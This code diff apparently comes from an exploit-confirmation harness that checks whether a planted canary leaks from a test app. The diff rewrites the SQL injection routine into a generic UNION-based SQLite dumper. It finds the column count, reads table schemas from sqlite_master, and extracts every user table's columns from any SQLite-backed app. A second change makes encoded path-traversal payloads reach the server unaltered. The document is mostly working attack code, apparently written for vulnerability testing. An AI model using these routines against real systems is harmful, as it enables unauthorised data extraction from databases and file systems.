@@ -11,6 +11,7 @@ whether the planted canary appears in what left the box.
 
 from __future__ import annotations
 
+import re
 from dataclasses import dataclass, field
 from urllib.parse import quote
 
@@ -38,39 +39,74 @@ def _split_source(input_source: str) -> tuple[str, str]:
 
 # --- SQL injection -----------------------------------------------------------
 
-def confirm_sqli(base_url: str, endpoint: str, input_source: str, timeout: float) -> ConfirmResult:
-    """UNION-based probe: try to pull the canary out of a secrets table.
+_CREATE_TABLE = re.compile(r"CREATE TABLE\s+[\"'`]?(\w+)[\"'`]?\s*\((.*?)\)", re.IGNORECASE | re.DOTALL)
 
-    We fire a baseline request and a family of injection payloads. Success is
-    decided by the oracle (did the canary appear), not by us.
+
+def confirm_sqli(base_url: str, endpoint: str, input_source: str, timeout: float) -> ConfirmResult:
+    """Generic UNION-based SQLite exfiltration -- not tied to any table name.
+
+    Determines the column count, reads the schema out of sqlite_master, then dumps
+    every user table's columns. The oracle decides success (did a canary appear),
+    so this works on any SQLite-backed app, not just the seeded one.
     """
     _, param = _split_source(input_source)
-    payloads = [
-        "-1 UNION SELECT value, label, id FROM secrets--",
-        "-1 UNION SELECT value, name, price FROM secrets--",
-        "0 OR 1=1",
-        "1'; SELECT value FROM secrets--",
-        "-1 UNION SELECT value FROM secrets--",
-    ]
     url = f"{base_url.rstrip('/')}{endpoint}"
     fired_req = ""
-    observable = ""
     combined = ""
     attempts: list[tuple[str, str]] = []
+
+    def parse_columns(create_body: str) -> list[str]:
+        cols = []
+        for part in create_body.split(","):
+            token = part.strip().strip('"`[]').split()
+            if token and token[0].lower() not in ("primary", "foreign", "unique", "check", "constraint"):
+                cols.append(token[0].strip('"`[]'))
+        return cols
+
     try:
         with httpx.Client(timeout=timeout, follow_redirects=True) as client:
-            baseline = client.get(url, params={param: "1"})
-            for p in payloads:
-                req = client.build_request("GET", url, params={param: p})
+            def fire(payload: str):
+                nonlocal fired_req, combined
+                req = client.build_request("GET", url, params={param: payload})
                 resp = client.send(req)
                 fired_req = str(req.url)
                 attempts.append((f"GET {fired_req}", resp.text))
-                combined += f"\n[{p}] -> {resp.status_code}\n{resp.text[:400]}"
-                # If the injection response differs and returns extra rows, note it.
-                if resp.status_code == 200 and resp.text != baseline.text:
-                    observable = resp.text[:400]
+                combined += f"\n[{payload[:80]}] -> {resp.status_code}\n{resp.text[:300]}"
+                return resp
+
+            # 1) Find the column count of the injectable query.
+            ncols = None
+            for n in range(1, 9):
+                nulls = ",".join(["NULL"] * n)
+                resp = fire(f"-1 UNION SELECT {nulls}")
+                if resp.status_code == 200 and "error" not in resp.text.lower():
+                    ncols = n
+                    break
+
+            def union(expr: str, suffix: str = "") -> str:
+                cols = [expr] + ["NULL"] * (ncols - 1)
+                return f"-1 UNION SELECT {','.join(cols)}{suffix}"
+
+            if ncols:
+                # 2) Read the schema (CREATE statements) out of sqlite_master.
+                schema = fire(union("group_concat(sql, '\n')", " FROM sqlite_master WHERE type='table'"))
+                tables = _CREATE_TABLE.findall(schema.text)
+                # 3) Dump every user table's columns; the oracle catches any canary.
+                for name, body in tables[:12]:
+                    if name.startswith("sqlite_"):
+                        continue
+                    cols = parse_columns(body)
+                    if not cols:
+                        continue
+                    concat = "||'|'||".join(f'"{c}"' for c in cols)
+                    fire(union(concat, f" FROM {name}"))
+            else:
+                # Fallback: classic boolean/UNION probes if column count wasn't found.
+                for payload in ("-1' OR '1'='1", "0 OR 1=1", "-1 UNION SELECT sql FROM sqlite_master--"):
+                    fire(payload)
     except httpx.HTTPError as exc:
         combined += f"\n[transport error] {exc}"
+    observable = combined[:400]
     return ConfirmResult(
         fired=bool(fired_req),
         exploit_request=f"GET {fired_req}",
@@ -101,7 +137,12 @@ def confirm_path_traversal(base_url: str, endpoint: str, input_source: str, time
     try:
         with httpx.Client(timeout=timeout, follow_redirects=True) as client:
             for p in payloads:
-                req = client.build_request("GET", url, params={param: p})
+                # Build the query manually. httpx's params= percent-encodes the
+                # '%' in encoded-slash payloads ('..%2f...' -> '..%252f...'), so
+                # the app would receive the literal '..%2f...' and the encoded
+                # evasion would never actually be tested. A raw query string puts
+                # '%2f' on the wire intact; the server decodes it to '/' itself.
+                req = client.build_request("GET", f"{url}?{quote(param)}={p}")
                 resp = client.send(req)
                 fired_req = str(req.url)
                 attempts.append((f"GET {fired_req}", resp.text))
